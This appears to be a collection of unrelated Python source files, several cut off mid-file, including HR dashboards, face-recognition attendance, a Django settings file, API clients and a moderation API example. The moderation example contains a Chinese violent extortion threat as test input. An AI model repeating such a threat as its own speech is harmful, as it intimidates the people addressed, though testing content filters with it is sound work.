pyautogui.sleep(1)\n\n############################for Scroll down function###################################\n                \n              if id == 20:\n                  cv2.circle(img=frame, center=(x, y), radius=10, color=(0, 255, 255))\n                  little_x = screen_width / frame_width * x\n                  little_y = screen_height / frame_height * y\n                  if abs(little_y - thumb_y) < 20:\n                        #print('scroll')\n                        pyautogui.scroll(-100)\n\n    \n    \n    cv2.imshow('Virtual Mouse', frame)\n    cv2.waitKey(1)\n",
    "import dash\nimport pandas as pd\nimport numpy as np\nfrom dash import html, dcc, dash_table, callback\nimport plotly.express as px\nimport plotly.graph_objects as go\nfrom dash.dependencies import Input, Output\nfrom scipy.stats import gaussian_kde\n\ndash.register_page(__name__, name='An\u00e1lisis Unidimensional', order=1)\n\ndata_path = 'data/HR_Analytics.csv'\n\ndef load_data(file_path):\n    try:\n        data = pd.read_csv(file_path)\n        return data\n    except FileNotFoundError:\n        print(f\"File not found: {file_path}\")\n        return None\n    except Exception as e:\n        print(f\"Error occurred: {e}\")\n        return None\ndata = load_data(data_path)\n\ndf = pd.read_csv(data_path)\n\n\ncolumns = ['Age', 'DailyRate', 'DistanceFromHome', 'HourlyRate', 'JobLevel', 'MonthlyIncome', 'MonthlyRate', 'NumCompaniesWorked', 'PercentSalaryHike',\n           'TotalWorkingYears', 'TrainingTimesLastYear', 'YearsAtCompany', 'YearsInCurrentRole', 'YearsSinceLastPromotion', 'YearsWithCurrManager']\n\n#Layout:\nlayout = html.Div(\n    children=[\n        html.H1('An\u00e1lisis Unidimensional'),\n        html.H3('Selecciona la primera columna:', style={\n            'display': 'inline-block', 'margin-right': '10px'}),\n        dcc.Dropdown(\n            id='column-select',\n            options=[{'label': i, 'value': i} for i in columns],\n            value=columns[0],\n            style={'width': '50%', 'display': 'inline-block',\n                   'margin-left': '20px'}\n        ),\n        dash_table.DataTable(id='table'),\n        dcc.Graph(id='histogram'),\n        html.Div(\n            children=[\n                dcc.Graph(id='box_fig_outliers', style={\n                          'display': 'inline-block', 'width': '50%'}),\n                dcc.Graph(id='box_fig_strip', style={\n                          'display': 'inline-block', 'width': '50%'})\n            ]\n        ),\n    ], style={'margin': '20px'}\n)\n\n# Callbacks:\n@callback(\n    [Output('table', 'data'), Output('table', 'columns'), Output('histogram', 'figure'), Output(\n        'box_fig_outliers', 'figure'), Output('box_fig_strip', 'figure')],\n    [Input('column-select', 'value')]\n)\ndef update_output(column):\n    stats = {\n        'Moda': round(df[column].mode()[0], 6),\n        'Rango': round(df[column].max() - df[column].min(), 6),\n        'Q1': round(df[column].quantile(0.25), 6),\n        'Mediana Q2': round(df[column].median(), 6),\n        'Q3': round(df[column].quantile(0.75), 6),\n        'std': round(df[column].std(), 6),\n        'var': round(df[column].var(), 6),\n        'CV': round(df[column].std() / df[column].mean(), 6),\n        'Min': round(df[column].min(), 6),\n        'M\u00e1x': round(df[column].max(), 6),\n        'Media': round(df[column].mean(), 6),\n        'Asimetr\u00eda': round(df[column].skew(), 6),\n        'Curtosis': round(df[column].kurt(), 6),\n    }\n    df_stats = pd.DataFrame.from_records([stats])\n    table_data = df_stats.to_dict('records')\n    table_columns = [{\"name\": i, \"id\": i} for i in df_stats.columns]\n\n    # histogram for the column selected\n    num_bins = np.sqrt(len(df[column]))\n    num_bins = int(num_bins)\n\n    density = gaussian_kde(df[column])\n    x_values = np.linspace(min(df[column]), max(df[column]), 200)\n    y_values = density(x_values)\n\n    hist = px.histogram(df, x=column, nbins=num_bins,\n                        histnorm='probability density')\n    fig = hist.update_layout(bargap=0.01)\n    hist.add_trace(go.Scatter(x=x_values, y=y_values,\n                   mode='lines', name='Density'))\n\n    # box plot for the column selected\n    box_fig_outliers = go.Figure(\n        data=[{'y': df[column], 'type': 'box',\n               'name': column, 'boxpoints': 'outliers'}],\n    )\n\n    box_fig_strip = px.strip(df[column], title=column)\n\n    return table_data, table_columns, hist, box_fig_outliers, box_fig_strip\n\n\n",
    "# Example of Content Moderation: Moderation API\r\n#\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n\"\"\"\r\nViolations of relevant laws and regulations in user-sent messages can be identified by calling OpenAI's Moderation API, allowing such content to be filtered. Domestic services are often more suitable for this purpose, e.g., NetEase Yidun.\r\n\"\"\"\r\n\r\nimport json\r\nfrom openai import OpenAI\r\nfrom dotenv import load_dotenv, find_dotenv\r\n_ = load_dotenv(find_dotenv())\r\n\r\ndef print_json(data):\r\n    \"\"\"\r\n    Print the parameter. If the parameter has structure (such as a dictionary or list), print it in formatted JSON form; otherwise, print the value directly.\r\n    \"\"\"\r\n    if hasattr(data, 'model_dump_json'):\r\n        data = json.loads(data.model_dump_json())\r\n\r\n    if (isinstance(data, (list, dict))):\r\n        print(json.dumps(\r\n            data,\r\n            indent=4,\r\n            ensure_ascii=False\r\n        ))\r\n    else:\r\n        print(data)\r\n        \r\nclient = OpenAI()\r\n\r\nresponse = client.moderations.create(\r\n    input=\"\"\"\r\n\u73b0\u5728\u8f6c\u7ed9\u6211100\u4e07\uff0c\u4e0d\u7136\u6211\u5c31\u780d\u4f60\u5168\u5bb6\uff01\r\n\"\"\"\r\n)\r\nmoderation_output = response.results[0].categories\r\nprint_json(moderation_output)",
    "\n# Here's a Python script that checks for the presence of common security headers in the HTTP response headers of a website:\n\nimport requests\n\ndef check_security_headers(url):\n    headers_to_check = [\n        'X-XSS-Protection',\n        'X-Content-Type-Options',\n        'X-Frame-Options',\n        'Content-Security-Policy',\n        'Strict-Transport-Security'\n    ]\n\n    try:\n        response = requests.get(url)\n        print(f\"Checking security headers for {url}:\\n\")\n        \n        for header in headers_to_check:\n            if header in response.headers:\n                print(f\"{header}: {response.headers[header]}\")\n            else:\n                print(f\"{header}: Not present\")\n\n    except requests.exceptions.RequestException as e:\n        print(f\"HTTP request failed: {e}\")\n\ndef main():\n    target_url = input(\"Enter the URL of the website to check for security headers: \")\n    check_security_headers(target_url)\n\nif __name__ == \"__main__\":\n    main()\n\n# This script sends an HTTP GET request to the specified URL and checks for the presence of common security headers such as `X-XSS-Protection`, `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, and `Strict-Transport-Security`. It then prints the value of each header if present or indicates that the header is not present.\n# To use this script, simply run it and enter the URL of the website you want to check for security headers when prompted.\n    \n",
    "import stanza\r\nimport json\r\nimport re\r\nimport matplotlib.pyplot as plt\r\nimport numpy as np\r\nimport seaborn as sns\r\n\r\nnlp = stanza.Pipeline('en', processors='tokenize', download_method=None)\r\n\r\ndef is_list_contained(full_list, sublist):\r\n    return set(sublist).issubset(set(full_list))\r\n\r\ndef draw_heat_map(wswa, wsra,rswa, rsra):\r\n    data = [[wswa, wsra], [rswa, rsra]]\r\n    print(data)\r\n    sns.heatmap(data, annot=True, fmt='d', cmap='Blues')\r\n    plt.title('bAbI-task3')\r\n    plt.ylabel('Selection Label')\r\n    plt.xlabel('Answer Label')\r\n    plt.show()\r\n    plt.savefig('bAbI-3_SA.png')\r\n\r\ndef count_token_num(text):\r\n    tokens = nlp(text)\r\n    total_tokens = 0\r\n    for sentence in tokens.sentences:\r\n        total_tokens += len(sentence.tokens)\r\n    return total_tokens\r\n\r\n\r\ndef has_at_least_two_common_words(str1, str2):\r\n    str1 = str1.replace(',', ' ').replace('.', ' ')\r\n    str2 = str2.replace(',', ' ').replace('.', ' ')\r\n    split_by_comma = str1.split(',')\r\n    words1 = [item.split(' ') for item in split_by_comma]\r\n    split_by_comma = str2.split(',')\r\n    words2 = [item.split(' ') for item in split_by_comma]\r\n\r\n    word_set1 = set([element for sublist in words1 for element in sublist])\r\n    word_set2 = set([element for sublist in words2 for element in sublist])\r\n    word_set1 = {word for word in word_set1 if len(word) > 3}\r\n    word_set2 = {word for word in word_set2 if len(word) > 3}\r\n\r\n    common_words = word_set1.intersection(word_set2)\r\n    return len(common_words) >= 2\r\n\r\ndef analyse_Evidence_Chain_Construction(result_path):\r\n    with open(result_path, \"r\") as f:\r\n        json_data = json.load(f)\r\n    compnum = 0\r\n    total = 0\r\n    for j in range(len(json_data)):\r\n        group = json_data[j]['main_chain']\r\n        suplist = json_data[j]['support_list']\r\n        complit_flag = False\r\n        chain_num = 0\r\n        for gitem,chainlist in group.items():\r\n            if is_list_contained(chainlist,suplist):\r\n                complit_flag = True\r\n                json_data[j]['rightchain'] = {'num':chain_num,'key':gitem,'chlist':chainlist}\r\n                break\r\n            chain_num += 1\r\n        if complit_flag:\r\n            compnum += 1\r\n        total += 1\r\n    print(compnum)\r\n    print(total)\r\n    print(compnum/total)\r\n    print(json_data[4])\r\n\r\ndef analyse_Evidence_Chain_Summarization_tokens(result_path):\r\n    with open(result_path, \"r\") as f:\r\n        json_data = json.load(f)\r\n    orign_token = 0\r\n    sum_token = 0\r\n    for j in range(len(json_data)):\r\n        doc_item = json_data[j]\r\n        text = \" \".join(doc_item['linelist'])\r\n        orign_token += count_token_num(text)\r\n        sum_token += count_token_num(doc_item['subject_chain'])\r\n    print(orign_token)\r\n    print(sum_token)\r\n    print((orign_token - sum_token) / orign_token)\r\n\r\ndef analyse_Evidence_Chain_Summarization_correctness(result_path):\r\n    with open(result_path, \"r\") as f:\r\n        json_data = json.load(f)\r\n    countRight = 0\r\n    countall = 0\r\n    for j in range(len(json_data)):\r\n        doc_item = json_data[j]\r\n        if 'subject_chain' not in doc_item:\r\n            continue\r\n        strtext = doc_item[\"subject_chain\"]\r\n        strlist = strtext.split(\"\\n\")\r\n        linelist = doc_item[\"linelist\"]\r\n        oindex = 0\r\n        for key, valuelist in doc_item['main_chain'].items():\r\n            sumtext = strlist[oindex]\r\n            chainlist = []\r\n            if key in sumtext:\r\n                count = 0\r\n                for vi in valuelist:\r\n                    time_info = re.findall(r't=(\\d+)', linelist[vi])\r\n                    # text_without_time = re.sub(r'\\(t=\\d+\\)', '', sumtext)\r\n                    text_without_time = re.sub(r\"\\[.*?\\]|\\(.*?\\)\", \"\", sumtext)\r\n                    text_without_time = text_without_time[8:]\r\n                    # if 't='+time_info[0] in sumtext:\r\n                    if has_at_least_two_common_words(text_without_time, linelist[vi]):\r\n                        count += 1\r\n                    else:\r\n                        break\r\n                if count == len(valuelist):\r\n                    countRight += 1\r\n            countall += 1\r\n            oindex += 1\r\n    print(countRight)\r\n    print(countall)\r\n\r\ndef analyse_chain_to_answer(baseline_result_path,result_path):\r\n    with open(result_path, \"r\") as f:\r\n        json_data = json.load(f)\r\n    with open(baseline_result_path, \"r\") as f:\r\n        sumresult_data = json.load(f)\r\n    sumresult_data = sumresult_data['answer']\r\n    wswa = 0\r\n    wsra = 0\r\n    rsra = 0\r\n    rswa = 0\r\n    for j in range(len(json_data)):\r\n        rchain = json_data[j]['rightchain']\r\n        fresp = sumresult_data[j]['final_resp']\r\n        if 'chain-' + str(rchain['num']) in fresp and rchain['key'] in fresp:\r\n            if sumresult_data[j]['answer'] == sumresult_data[j]['true_label']:\r\n                rsra += 1\r\n            else:\r\n                rswa += 1\r\n        else:\r\n            if sumresult_data[j]['answer'] == sumresult_data[j]['true_label']:\r\n                ws",
    "import numpy as np\nimport cv2\nimport torch\nfrom facenet_pytorch import MTCNN\nfrom facenet_pytorch import InceptionResnetV1\nfrom sklearn.ensemble import RandomForestClassifier\nimport joblib\nimport datetime as dt\nimport pandas as pd\nimport paho.mqtt.client as mqtt\nimport RPi.GPIO as GPIO\nimport time\n\nclass FaceRecognition:\n    def __init__(self):\n        # Load models and resources\n        self.mtcnn = MTCNN(thresholds=[0.9, 0.9, 0.9])\n        self.facenet_model = InceptionResnetV1(pretrained='vggface2').eval()\n        self.clf = joblib.load(\"/Users/sagarkumbhar/Documents/TLC_Polymers_Ltd./classifiers/randomForest/randomforestClassifier.joblib\")\n        self.label_to_name = {0: 'A39 Akash Khulpe',  1: 'A56 Anuj Gavhane', 2:'A50 Devang Edle', 3:'A51 Deepanshu Gadling', \n                              4:'A45 Gaurav Diwedi', 5:'A41 Parimal Kumar', 6:'A40 Parth Deshpande',7:'A46 Rutuja Doiphode',\n                              8:'A47 Sagar Kumbhar'}\n        self.threshold = 0.7  \n        self.attendance_records = []\n        self.predicted_names = []\n        self.broker_address = \"localhost\"\n        self.topic = \"hello/world\"\n        self.client = mqtt.Client()\n        \n\n    def recognize_faces(self, frame):\n        \"\"\" This method takes frames and performs face recognition by detecting faces through MTCNN.\n        The detected face area from the frames is fed to FaceNet and embeddings are extracted.\n        After sucessfull identification of people the name and entry time are stored in a pandas \n        dataframe ans saved as a CSV file\"\"\"\n        \n        current_time = dt.datetime.now().strftime('%I: %M: %S %p')\n        boxes, _ = self.mtcnn.detect(frame) \n        \n        # checks whether bounding boxes(faces) are present in the frames\n        if boxes is not None: \n            faces = [] \n            face_boxes = [] \n            \n            for box in boxes: \n                x1, y1, x2, y2 = box.astype(int) \n                face = frame[y1:y2, x1:x2] \n                \n                if face.size != 0: \n                    face = cv2.resize(face, (160, 160)) \n                    face = torch.from_numpy(face).permute(2, 0, 1).float() \n                    face = (face - 127.5) / 128.0 \n                    faces.append(face) \n                    face_boxes.append((x1, y1, x2, y2)) \n                    \n            if len(faces) > 0:\n                # Convert faces list to a batch tensor\n                faces = torch.stack(faces)\n\n                # Generate embeddings for all faces in the batch\n                with torch.no_grad():\n                    embeddings = self.facenet_model(faces)\n\n                # Perform predictions on the embeddings\n                predictions = self.clf.predict(embeddings.numpy())\n                probabilities = self.clf.predict_proba(embeddings.numpy())\n\n                # Iterate over the predictions and draw bounding boxes\n                for prediction, probability, box in zip(predictions, probabilities, face_boxes):\n                    if probability.max() >= self.threshold:\n                        predicted_name = self.label_to_name[int(prediction)]\n                        #print(\"Predicted name:\", predicted_name)\n                        current_date = dt.datetime.now().strftime('%d-%m-%y')\n                        current_confidence = probability.max()\n                \n                        if not any(record['Name'] == predicted_name for record in self.attendance_records):\n                            # Append attendance record to the list\n                            self.attendance_records.append({'Name': predicted_name, 'Date': current_date, 'Time': current_time})\n                \n                        #uncomment this to see probability/confidence of each class\n                        #print(probabilities)  \n                \n                        cv2.putText(frame, predicted_name, (box[0], box[1] - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.9,\n                                (36, 255, 12), 2)\n                        cv2.rectangle(frame, (box[0], box[1]), (box[2], box[3]), (0, 255, 0), 2)\n                    else:\n                        cv2.putText(frame, 'unknown person', (box[0], box[1] - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.9,\n                                (36, 255, 12), 2)\n                        cv2.rectangle(frame, (box[0], box[1]), (box[2], box[3]), (0, 255, 0), 2)\n                \n                    # Print all predicted names together\n                    self.predicted_names = [self.label_to_name[int(prediction)] if probability.max() >= self.threshold else 'unknown person' for prediction, probability in zip(predictions, probabilities)]\n                    #print(\"Predicted names:\", predicted_names)\n\n                    attendance_df = pd.DataFrame(self.attendance_records)\n\n                    # Save the DataFrame to a CSV file\n                    attendance_df.to_csv('attendance_records.csv', index=False)\n\n    \n    def run(self):\n        \"\"\" This method initializes the came",
    "\"\"\"\nDjango settings for Dj101 project.\n\nGenerated by 'django-admin startproject' using Django 5.0.4.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/5.0/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/5.0/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/5.0/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'django-insecure-ytn-2jt*rh(d&4j14loc=^@f=(#bac=nn_%82-41)(=t=thyf^'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'Dj101.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [\n            BASE_DIR / \"templates\"\n            ],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'Dj101.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/5.0/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.sqlite3',\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/5.0/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/5.0/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/5.0/howto/static-files/\n\nSTATIC_URL = 'static/'\nSTATICFILES_DIRS = [\n    BASE_DIR / \"static\"\n]\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/5.0/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n",
    "import sqlite3\n\nfrom addict import Dict\n\n\nclass DB:\n    DATA = \"src/data/\"\n    DB = DATA + \"base.db\"\n    SCRIPTS = DATA + \"scripts/\"\n    READ = Dict(\n        get_user=\"SELECT username, first_name FROM users WHERE user_id = ? LIMIT 1\",\n        get_users=\"SELECT * FROM users ORDER BY time DESC LIMIT ?\",\n        get_user_chat=\"SELECT * FROM messages WHERE chat_id = ? AND user_id = ? ORDER BY time DESC LIMIT ?\",\n        get_chat=\"SELECT * FROM messages WHERE chat_id = ? ORDER BY time DESC LIMIT ?\",\n        get_messages=\"SELECT * FROM messages ORDER BY time DESC LIMIT ?\",\n        get_requests=\"SELECT * FROM requests ORDER BY time DESC LIMIT ?\",\n        get_active_requests=\"SELECT * FROM requests WHERE active = 1 ORDER BY time DESC LIMIT ?\",\n        get_active_event_requests=\"SELECT * FROM requests WHERE active = 1 AND watch_type = 'event' ORDER BY time DESC LIMIT ?\",\n        get_active_call_requests=\"SELECT * FROM requests WHERE active = 1 AND watch_type = 'call' ORDER BY time DESC LIMIT ?\",\n        get_inactive_requests=\"SELECT * FROM requests WHERE active = 0 ORDER BY time DESC LIMIT ?\",\n        get_inactive_event_requests=\"SELECT * FROM requests WHERE active = 0 AND watch_type = 'event' ORDER BY time DESC LIMIT ?\",\n        get_inactive_call_requests=\"SELECT * FROM requests WHERE active = 0 AND watch_type = 'call' ORDER BY time DESC LIMIT ?\",\n        get_active_requests_by_user_chat=\"SELECT * FROM requests WHERE chat_id = ? AND user_id = ? AND active = 1 ORDER BY time DESC LIMIT ?\",\n        get_inactive_requests_by_user_chat=\"SELECT * FROM requests WHERE chat_id = ? AND user_id = ? AND active = 0 ORDER BY time DESC LIMIT ?\",\n    )\n    WRITE = Dict(\n        insert_user=\"INSERT INTO users (user_id, username, first_name, time) VALUES (?, ?, ?, datetime('now'))\",\n        insert_message=\"INSERT INTO messages (chat_id, user_id, content, agent, time) VALUES (?, ?, ?, ?, datetime('now'))\",\n        insert_request=\"INSERT INTO requests (chat_id, user_id, watch_type, addr, abi, method, args, condition, decimals, intention, active, time) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, datetime('now'))\",\n        enable_request=\"UPDATE requests SET active = 1 WHERE id = ?\",\n        disable_request=\"UPDATE requests SET active = 0 WHERE id = ?\",\n        delete_all_user_requests=\"DELETE FROM requests WHERE chat_id = ? AND user_id = ?\",\n    )\n\n    def reset(self):\n        self.run_script(\"reset\")\n        self.run_script(\"init\")\n\n    def run_script(self, name, iter=1):\n        with sqlite3.connect(self.DB) as db:\n            c = db.cursor()\n            with open(self.SCRIPTS + name + \".sql\", \"r\") as f:\n                script = f.read()\n                for _ in range(iter):\n                    c.executescript(script)\n                db.commit()\n\n    def fetch(self, query, *values):\n        with sqlite3.connect(self.DB) as db:\n            c = db.cursor()\n            c.execute(self.READ.get(query), values)\n            return c.fetchall()\n\n    def commit(self, query, *values):\n        with sqlite3.connect(self.DB) as db:\n            c = db.cursor()\n            c.execute(self.WRITE.get(query), values)\n            new_id = c.lastrowid\n            db.commit()\n            return new_id\n",
    "# interact with Validin API\n# {dmitry.chan|john.lampe}@gmail.com\n\nimport requests\nimport logging\nimport pdb\n\n\nclass Validin:\n    def __init__(self, api_key=None, verify=True):\n        if api_key:\n            self.api_key = api_key\n            self.verify = verify\n        else:\n            logging.error(\"Need an API key. Edit validin.yml and add. Program exiting\")\n            print(\"Need an API key. Edit validin.yml and add. Program exiting\")\n            exit(0)\n\n        self.base_url = \"https://app.validin.com/api/axon/\"\n\n        self.session = requests.Session()\n        self.session.verify = self.verify\n        self.session.headers = {\"Accept\": \"*/*\",\n                                \"Authorization\": \"Bearer {}\".format(self.api_key)}\n\n    def get(self, *args, **kwargs):\n        \"\"\"\n        Sends an HTTP GET request to the uri (*args)\n        :param args: URI\n        :param kwargs: options to the GET request\n        :return: string\n        \"\"\"\n        ret = self.session.get(*args, **kwargs)\n        if ret.status_code == 200:\n            return ret.json()\n        else:\n            return {'Error' : \"Received a non-200 response when requesting domain : {}. Status Code: {}\".format(*args, ret.status_code)}\n\n\n    def domain_history_a_aaaa_ns(self, domain=None, **kwargs):\n        \"\"\"\n        https://app.validin.com/docs/getDNSHistory\n        Retrieve A, AAAA, and NS records\n        :param domain: required string\n        :param limit: optional, integer must be between 1-1000\n        :param wildcard: optional Boolean\n        :param first_seen: optional, string, format YYYY-MM-DD\n        :param last_seen: optional, string, format YYYY-MM-DD\n        :return: JSON\n        \"\"\"\n\n        if not domain:\n            return {'Error' : \"No domain specified\"}\n        else:\n            uri = \"{}domain/dns/history/{}\".format(self.base_url, domain)\n\n        ret = self.get(uri, **kwargs)\n        return ret\n\n    def domain_a(self, domain=None, **kwargs):\n        \"\"\"\n        https://app.validin.com/docs/getDNSHistoryA\n        Retrieve A records\n        :param domain: required string\n        :param kwargs: optional GET params to pass to query\n        :return: JSON\n        \"\"\"\n        if not domain:\n            return {'Error' : \"No domain specified\"}\n        else:\n            uri = \"{}domain/dns/history/{}/A\".format(self.base_url, domain)\n\n        ret = self.get(uri, **kwargs)\n        return ret\n\n    def domain_aaaa(self, domain=None, **kwargs):\n        \"\"\"\n        https://app.validin.com/docs/getDNSHistoryAAAA\n        Retrieve AAAA records\n        :param domain: required string\n        :param kwargs: optional GET params to pass to query\n        :return: JSON\n        \"\"\"\n        if not domain:\n            return {'Error' : \"No domain specified\"}\n        else:\n            uri = \"{}domain/dns/history/{}/AAAA\".format(self.base_url, domain)\n\n        ret = self.get(uri, **kwargs)\n        return ret\n\n    def domain_ns(self, domain=None, **kwargs):\n        \"\"\"\n        https://app.validin.com/docs/getDNSHistoryNS\n        Retrieve NS records\n        :param domain: required string\n        :param kwargs: optional GET params to pass to query\n        :return: JSON\n        \"\"\"\n        if not domain:\n            return {'Error' : \"No domain specified\"}\n        else:\n            uri = \"{}domain/dns/history/{}/NS\".format(self.base_url, domain)\n\n        ret = self.get(uri, **kwargs)\n        return ret\n\n    def domain_ns_for(self, domain=None, **kwargs):\n        \"\"\"\n        https://app.validin.com/docs/getDNSHistoryNS_FOR\n        Retrieve NS records\n        :param domain: required string\n        :param kwargs: optional GET params to pass to query\n        :return: JSON\n        \"\"\"\n        if not domain:\n            return {'Error' : \"No domain specified\"}\n        else:\n            uri = \"{}domain/dns/history/{}/NS_FOR\".format(self.base_url, domain)\n\n        ret = self.get(uri, **kwargs)\n        return ret\n\n    def domain_ptr(self, domain=None, **kwargs):\n        \"\"\"\n        https://app.validin.com/docs/getDomainPTR\n        Retrieve PTR records\n        :param domain: required string\n        :param kwargs: optional GET params to pass to query\n        :return: JSON\n        \"\"\"\n        if not domain:\n            return {'Error' : \"No domain specified\"}\n        else:\n            uri = \"{}domain/dns/hostname/{}\".format(self.base_url, domain)\n\n        ret = self.get(uri, **kwargs)\n        return ret\n\n    def domain_osint(self, domain=None, **kwargs):\n        \"\"\"\n        https://app.validin.com/docs/getDomainOsintHistory\n        Retrieve OSINT analysis\n         :param domain: required string\n        :param kwargs: optional GET params to pass to query\n        :return: JSON\n        \"\"\"\n        if not domain:\n            return {'Error' : \"No domain specified\"}\n        else:\n            uri = \"{}domain/osint/history/{}\".format(self.base_url, domain)\n\n        ret = self.get(uri, **kwargs)\n        return ret\n\n    def domain_osint_context(self, domain=None, **kwargs)",
    "\"\"\"\n# Huggingface models\n- https://huggingface.co/openai/whisper-medium\n- https://huggingface.co/pyannote/speaker-diarization-3.0\n\"\"\"\n\nfrom typing import List, Optional, Union\n\nimport numpy as np\nimport requests\nimport torch\nfrom pyannote.audio import Pipeline\nfrom torchaudio import functional as F\nfrom transformers import pipeline\nfrom transformers.pipelines.audio_utils import ffmpeg_read\n\nimport warnings\nwarnings.filterwarnings(\"ignore\")\n\nfrom dotenv import dotenv_values\n# Load environment variables from .env file\nenv_vars = dotenv_values(\".env\")\nHF_TOKEN = env_vars.get(\"HF_TOKEN\")\n\nfrom huggingface_hub import login\nlogin(token = HF_TOKEN)\n\nclass ASRDiarizationPipeline:\n    def __init__(self, asr_pipeline, diarization_pipeline):\n        self.asr_pipeline = asr_pipeline\n        self.sampling_rate = self.asr_pipeline.feature_extractor.sampling_rate\n\n        self.diarization_pipeline = diarization_pipeline\n\n\n    @classmethod\n    def from_pretrained(\n        cls,\n        asr_model = \"openai/whisper-medium\",\n        diarization_model = \"pyannote/speaker-diarization-3.0\",\n        chunk_length_s = 30,\n        use_auth_token = True,\n        device = \"cuda\"\n    ):\n        asr_pipeline = pipeline(\n          \"automatic-speech-recognition\",\n          model=asr_model,\n          chunk_length_s=chunk_length_s,\n          device=f\"{device}:0\",\n          token=use_auth_token,\n        )\n        diarization_pipeline = Pipeline.from_pretrained(diarization_model, use_auth_token=use_auth_token)\n        diarization_pipeline.to(torch.device(device))\n\n        return cls(asr_pipeline, diarization_pipeline)\n\n\n    def postprocess_diarization(self, diarization_result):\n        segments = []\n        for segment, track, label in diarization_result.itertracks(yield_label=True):\n            segments.append({'segment': {'start': segment.start, 'end': segment.end},\n                            'track': track,\n                            'label': label})\n\n        new_segments = []\n        prev_segment = cur_segment = segments[0]\n        for i in range(1, len(segments)):\n            cur_segment = segments[i]\n\n            # check if there changed speaker (\"label\")\n            if cur_segment[\"label\"] != prev_segment[\"label\"] and i < len(segments):\n                # add the start/end times for the super-segment to the new list\n                new_segments.append(\n                    {\n                        \"segment\": {\"start\": prev_segment[\"segment\"][\"start\"], \"end\": cur_segment[\"segment\"][\"start\"]},\n                        \"speaker\": prev_segment[\"label\"],\n                    }\n                )\n                prev_segment = segments[i]\n\n        # add the last segment(s) if there was no speaker change\n        new_segments.append(\n            {\n                \"segment\": {\"start\": prev_segment[\"segment\"][\"start\"], \"end\": cur_segment[\"segment\"][\"end\"]},\n                \"speaker\": prev_segment[\"label\"],\n            }\n        )\n\n        return new_segments\n    \n\n    def merge_trancription(self, segments, asr_out, group_by_speaker=True):\n        transcript = asr_out[\"chunks\"]\n\n        # get the end timestamps for each chunk from the ASR output\n        end_timestamps = np.array([chunk[\"timestamp\"][-1] for chunk in transcript])\n\n        segmented_preds = []\n        # align the diarizer timestamps and the ASR timestamps\n        for segment in segments:\n            # get the diarizer end timestamp\n            end_time = segment[\"segment\"][\"end\"]\n            \n            # find the ASR end timestamp that is closest to the diarizer's end timestamp and cut the transcript to here\n            upto_idx = np.argmin(np.abs(end_timestamps - end_time))\n\n            if group_by_speaker:\n                segmented_preds.append(\n                    {\n                        \"speaker\": segment[\"speaker\"],\n                        \"text\": \"\".join([chunk[\"text\"] for chunk in transcript[: upto_idx + 1]]),\n                        \"timestamp\": (transcript[0][\"timestamp\"][0], transcript[upto_idx][\"timestamp\"][1]),\n                    }\n                )\n            else:\n                for i in range(upto_idx + 1):\n                    segmented_preds.append({\"speaker\": segment[\"speaker\"], **transcript[i]})\n\n            # crop the transcripts and timestamp lists according to the latest timestamp (for faster argmin)\n            transcript = transcript[upto_idx + 1 :]\n            end_timestamps = end_timestamps[upto_idx + 1 :]\n\n            if len(end_timestamps) == 0:\n                break\n\n        return segmented_preds\n\n\n    def __call__(self, inputs, 